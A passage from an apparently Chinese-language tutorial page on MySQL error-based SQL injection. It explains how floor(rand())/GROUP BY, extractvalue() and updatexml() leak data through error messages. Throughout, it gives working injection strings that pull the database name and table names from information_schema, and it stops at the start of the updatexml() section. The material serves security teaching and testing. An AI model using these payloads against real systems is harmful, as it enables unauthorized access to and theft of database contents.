<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 查询数据库名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and updatexml(0x7e,concat(0x7e, (select database())),0x7e) and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219120114605" src="/assets/images/image-20211219120114605-0e0f13c8ed00e1b2310c4c1be5539d32.png" width="1640" height="348" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 查询当前数据库所有的表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and updatexml(0x7e,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = database())),0x7e) and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219120226839" src="/assets/images/image-20211219120226839-963f87ef6058eab11738e7da2891d62f.png" width="1878" height="360" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="报错函数">报错函数<a href="#报错函数" class="hash-link" aria-label="报错函数的直接链接" title="报错函数的直接链接">​</a></h3>
<p>列举能够被报错注入利用的一些函数</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="floor">floor()<a href="#floor" class="hash-link" aria-label="floor()的直接链接" title="floor()的直接链接">​</a></h4>
<p><strong>相关函数：</strong></p>
<ul>
<li><code>floor()</code>函数，向下取整，小数部分舍弃</li>
<li><code>rand()</code>函数，取随机数，若有参数x，则每个x对应一个固定的值</li>
<li><code>count()</code>函数，统计结果数量</li>
<li><code>select floor(rand(0)*2) from information_schema.SCHEMATA;</code> 后面表可以随意换，只要数据量&gt;=6即可，产生的固定序列为011011...</li>
</ul>
<p><strong>报错原理：</strong></p>
<p>利用数据库表主键不能重复的原理，使用<code>GROPU BY</code>分组，产生主键key冗余，导致报错</p>
<p><strong><code>GROPU BY</code>原理：</strong></p>
<p><code>group by</code>主要用来对数据进行分组，相同的分为一组，常与<code>count()</code>结合使用。执行过程中会建立一个有两个字段的虚拟表，一个是分组的<code>key</code>，一个是计数值 <code>count(*)</code>。在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组。</p>
<ul>
<li><code>group by</code>过程举例说明：</li>
</ul>
<p>已知表<code>users</code>如下</p>
<table><thead><tr><th>ID</th><th>NAME</th></tr></thead><tbody><tr><td>1</td><td>AA</td></tr><tr><td>2</td><td>AA</td></tr><tr><td>3</td><td>BB</td></tr></tbody></table>
<p>sql语句</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> uses </span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><br></span></code></pre></div></div>
<p>在进行分组运算的时候会根据name属性，创建一个虚拟表，从上至下扫描，当扫描到第一行<code>NAME === AA</code>的时候，当前虚拟表没有该字段，那么插入此虚拟表，<code>count = 1</code></p>
<table><thead><tr><th>count</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>AA</td></tr></tbody></table>
<p>当扫描到第二行<code>NAME === AA</code>的时候</p>
<p>当前虚拟表存在该字段，那么<code>count + 1</code></p>
<table><thead><tr><th>count</th><th>name</th></tr></thead><tbody><tr><td>2</td><td>AA</td></tr></tbody></table>
<p>当扫描到第三行 <code>NAME === BB</code> 的时候</p>
<p>当前虚拟表不存在该字段，执行插入，count = 1</p>
<table><thead><tr><th>count</th><th>name</th></tr></thead><tbody><tr><td>2</td><td>AA</td></tr><tr><td>1</td><td>BB</td></tr></tbody></table>
<hr>
<ul>
<li>报错过程举例说明：</li>
</ul>
<p>那么利用<code> floor(rand(0)*2)</code> 这个函数的返回值，进行分组，因为序列为<code>011011...</code></p>
<p>那么构建SQL语句</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">COUNT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">RAND</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">GROUP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> x</span><br></span></code></pre></div></div>
<p>查询第一条记录，别名x产生键值0，当键值0不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照GROUP BY分组之时 又要执行floor函数，得到1，故向虚拟表中插入键值1，count = 1</p>
<blockquote>
<p>group by 进行分组时，<code>floor(rand(0)*2)</code>执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候 <code>floor(rand(0)*2)</code> 就又计算了一次</p>
</blockquote>
<table><thead><tr><th>COUNT</th><th>x</th></tr></thead><tbody><tr><td>1</td><td>1</td></tr></tbody></table>
<p>查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2</p>
<table><thead><tr><th>COUNT</th><th>x</th></tr></thead><tbody><tr><td>2</td><td>1</td></tr></tbody></table>
<p>查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示</p>
<table><thead><tr><th>COUNT</th><th>x</th></tr></thead><tbody><tr><td>2</td><td>1</td></tr><tr><td>1</td><td>1</td></tr></tbody></table>
<p>由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错；数据库报错会将报错原因展示出来，故利用报错来实现注入</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>整个查询过程<code>floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以要保证floor报错注入，那么必须保证数据库中相关的表必须大于三条数据</li>
<li>需要<code>count(*)</code>，<code>rand()</code>、<code>group by</code>，三者缺一不可</li>
</ol>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 变形</span><br></span></code></pre></div></div>
<p><code>floor</code>报错注入的利用，通俗点说就是利用<code>concat()</code>构造特殊的主键，当主键值不唯一时就报错并回显该主键值，主键值中就包含着我们想要的内容。</p>
<ul>
<li>获取数据库名</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">COLUMNS</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GROUP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">COLUMNS</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GROUP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>由于 and 后要跟1或者0，所以构造sql语句<code>select 1</code>，其中<code>concat()</code>函数是用来连接字符串的函数，因为<code>information_schema.columns</code>的数据是大于3条，所以会出现报错，报错结果或将别名x的信息展示出来，展示信息为<code>#(数据库名称)#1</code>冗余</p>
<p><img decoding="async" loading="lazy" alt="image-20211220100905604" src="/assets/images/image-20211220100905604-fd9bb2e81268edb87cf3079e3385d308.png" width="1980" height="364" class="img_ev3q"></p>
<ul>
<li>获取表名</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">TABLES</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> table_schema </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">LIMIT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> x </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">COLUMNS</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GROUP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">TABLES</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> table_schema </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">COLUMNS</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GROUP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220101751724" src="/assets/images/image-20211220101751724-e780d668d0e33e44349c60789a309ee6.png" width="1944" height="352" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="extractvalue">extractValue()<a href="#extractvalue" class="hash-link" aria-label="extractValue()的直接链接" title="extractValue()的直接链接">​</a></h4>
<p><strong>函数语法：</strong><code>extractvalue(xml_frag,xpath_expr)</code></p>
<p><strong>适用范围：</strong><code>&gt;=5.1.5</code></p>
<p>**报错原理：**Xpath格式语法书写错误的话，就会报错，如下所示</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&lt;a&gt;&lt;b&gt;x&lt;/b&gt;&lt;b&gt;y&lt;/b&gt;&lt;/a&gt;&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;/a/b&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> result</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> result </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> x y    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">row</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.00</span><span class="token plain"> sec</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&lt;a&gt;&lt;b&gt;x&lt;/b&gt;&lt;b&gt;y&lt;/b&gt;&lt;/a&gt;&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;#aaa&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> result</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR </span><span class="token number" style="color:#36acaa">1105</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HY000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: XPATH syntax error: </span><span class="token string" style="color:#e3116c">&#x27;#aaa&#x27;</span><br></span></code></pre></div></div>
<blockquote>
<p>由于此报错注入和<code>updatexml</code>都只能爆最大32位，如果要爆出32位之后的数据，需要借助<code>mid</code>或者<code>substr</code>等切割函数进行字符截取从而显示32位以后的数据</p>
</blockquote>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and extractvalue(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32)) and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219175002273" src="/assets/images/image-20211219175002273-ae6e9196bdafafd2bcbb1018de72e55e.png" width="1842" height="358" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="updatexml">updatexml()<a href="#updatexml" class="hash-link" aria-label="updatexml()的直接链接" title="updatexml()的直接链接">​</a></h4>
<p><strong>函数语法：</strong><code>updatexml(XML_document,XPath_String,new_value)</code></p>
<p><strong>适用范围：</strong>&gt;=5.1.5</p>
